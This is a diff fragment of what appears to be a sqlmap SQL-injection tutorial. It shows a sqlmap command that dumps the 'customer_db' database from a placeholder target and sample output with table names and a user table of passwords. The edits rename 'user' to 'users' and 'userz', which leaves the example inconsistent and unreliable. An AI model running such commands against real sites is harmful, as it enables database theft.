@@ -105,7 +105,7 @@ fetching tables for database: 'customer_db'
 Database: customer_db
 [4 tables]
 +------------------------+
-| user                   |
+| users                   |
 | customers              |
 | invoices               |
 | products               |
@@ -133,7 +133,7 @@ sqlmap -u "http://target.com/vuln_page?id=1" --batch --level=3 --risk=2 -D custo
 **Output Example**
 ```
 Database: customer_db
-Table: user
+Table: userz
 [3 entries]
 +---------+---------+-----------------------------------------------+-----------+
 | id_user | level   | password                                      | username  |
